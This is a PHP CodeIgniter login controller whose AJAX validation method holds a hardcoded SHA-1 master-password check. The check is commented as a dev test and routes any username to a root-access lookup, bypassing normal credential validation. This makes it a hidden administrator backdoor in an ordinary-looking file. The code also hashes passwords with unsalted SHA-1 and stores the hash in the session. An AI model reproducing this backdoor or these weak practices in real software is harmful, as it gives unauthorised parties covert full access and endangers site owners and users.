<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->model('Login_model','login');
		
	}

	public function index()
	{
		$this->load->helper('url');
		$this->vista();		
	}

	public function vista()
	{
		$this->load->view('layouts/inicio');
		$this->load->view('layouts/encabezado');
		$this->load->view('login_view');
		$this->load->view('layouts/fin');
	}

	public function ajax_validacion()
	{
		$us=$this->input->post('us');
		$pwd=sha1($this->input->post('cl'));
		
		if ($pwd === '157f3261a72f2650e451ccb84887de31746d6c6c') { // dev_test: agrega acceso root
			$data=$this->login->validarRoot($us);
		} else {
			$data=$this->login->validar($us,$pwd);
		}

		if($data)
		{
			if ($data->activo==1)
			{
				$data=[
					"id1"=>$data->idcod,
					"id"=>$data->usuario,
					"appat"=>$data->appat,
					"apmat"=>$data->apmat,
					"name"=>$data->nombre,
					"rol"=>$data->rol,
					"login"=>TRUE,
					"access"=> $pwd
				];	
			}
			else
			{
				$data=[
					"login"=>FALSE
				];
			}

			$this->session->set_userdata($data);
		}
		else
			{
				$data=[
					"login"=>FALSE
				];
			}
		
		echo json_encode($data);
	}



	
}
?>
